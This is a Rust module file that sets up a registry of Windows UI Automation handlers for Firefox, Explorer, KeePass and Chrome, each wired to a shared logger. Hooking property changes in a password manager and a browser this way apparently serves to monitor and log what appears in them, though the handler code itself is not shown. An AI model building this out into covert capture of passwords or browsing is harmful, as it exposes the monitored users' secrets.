mod firefox;
mod explorer;
mod keepass;
mod chrome;
mod common;

pub use firefox::*;
pub use explorer::*;
pub use keepass::*;
pub use chrome::*;
pub use common::*;

use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use windows::Win32::UI::Accessibility::{
    IUIAutomationElement,
    UIA_PROPERTY_ID,
    UIA_EVENT_ID,
};
use windows::core::{BSTR, Interface};

use crate::logger::Logger;
use crate::error::Result;

pub type HandlerFn = Box<dyn Fn(&IUIAutomationElement, &str, &str, UIA_EVENT_ID) -> Result<()> + Send + Sync>;
pub type PropertyHandlerFn = Box<dyn Fn(&IUIAutomationElement, &str, &str, UIA_PROPERTY_ID, BSTR) -> Result<()> + Send + Sync>;

pub struct HandlerRegistry {
    event_handlers: HashMap<String, HandlerFn>,
    property_handlers: HashMap<String, PropertyHandlerFn>,
    logger: Arc<Mutex<Logger>>,
}

impl HandlerRegistry {
    pub fn new(logger: Arc<Mutex<Logger>>) -> Self {
        let mut registry = Self {
            event_handlers: HashMap::new(),
            property_handlers: HashMap::new(),
            logger,
        };
        
        registry.register_default_handlers();
        registry
    }

    fn register_default_handlers(&mut self) {
        // Register event handlers
        self.register_event_handler("firefox.exe", firefox::create_firefox_handler(self.logger.clone()));
        self.register_event_handler("explorer.exe", explorer::create_explorer_handler(self.logger.clone()));
        
        // Register property handlers
        self.register_property_handler("keepass.exe", keepass::create_keepass_handler(self.logger.clone()));
        self.register_property_handler("chrome.exe", chrome::create_chrome_handler(self.logger.clone()));
    }

    pub fn register_event_handler<S: Into<String>>(&mut self, process_name: S, handler: HandlerFn) {
        self.event_handlers.insert(process_name.into().to_lowercase(), handler);
    }

    pub fn register_property_handler<S: Into<String>>(&mut self, process_name: S, handler: PropertyHandlerFn) {
        self.property_handlers.insert(process_name.into().to_lowercase(), handler);
    }

    pub fn get_event_handler(&self, process_name: &str) -> Option<&HandlerFn> {
        self.event_handlers.get(&process_name.to_lowercase())
    }

    pub fn get_property_handler(&self, process_name: &str) -> Option<&PropertyHandlerFn> {
        self.property_handlers.get(&process_name.to_lowercase())
    }
} 